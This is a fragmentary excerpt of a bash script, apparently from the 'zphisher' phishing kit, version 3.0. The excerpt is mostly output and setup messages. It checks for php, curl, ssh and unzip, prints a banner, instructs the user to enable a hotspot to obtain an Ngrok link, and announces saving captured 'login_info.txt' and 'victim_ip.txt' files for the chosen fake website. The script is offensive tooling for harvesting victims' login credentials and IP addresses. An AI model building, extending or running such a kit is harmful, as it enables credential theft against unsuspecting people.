...
command -v php > /dev/null 2>&1 || { printf >&2 "\e[0m\e[1;96mPackages are not installed !\n\nType \e[0m\e[1;93m'bash setup'\e[0m\e[1;96m to install it .\n\n"; exit 1; }
command -v curl > /dev/null 2>&1 || { printf >&2 "\e[0m\e[1;96mPackages are not installed !\n\nType \e[0m\e[1;93m'bash setup'\e[0m\e[1;96m to install it .\n\n"; exit 1; }
command -v ssh > /dev/null 2>&1 || { printf >&2 "\e[0m\e[1;96mPackages are not installed !\n\nType \e[0m\e[1;93m'bash setup'\e[0m\e[1;96m to install it .\n\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { printf >&2 "\e[0m\e[1;96mPackages are not installed !\n\nType \e[0m\e[1;93m'bash setup'\e[0m\e[1;96m to install it .\n\n"; exit 1; }
...
printf " \e[33;1m      | |                                \e[0m\n"
printf " \e[33;1m      |_|           \e[1;97m    Version 3.0      \e[0m\n"
printf " \n"
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Turn on Hotspot To get Ngrok Link !!\e[0m\n"
printf "\e[0m\n"
...
printf "\e[1;93m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m "
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ~/zphisher/websites/%s/login_info.txt\e[0m\n" $server
printf "\n"
...
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ~/zphisher/websites/%s/victim_ip.txt\e[0m\n" $server
printf "\n"
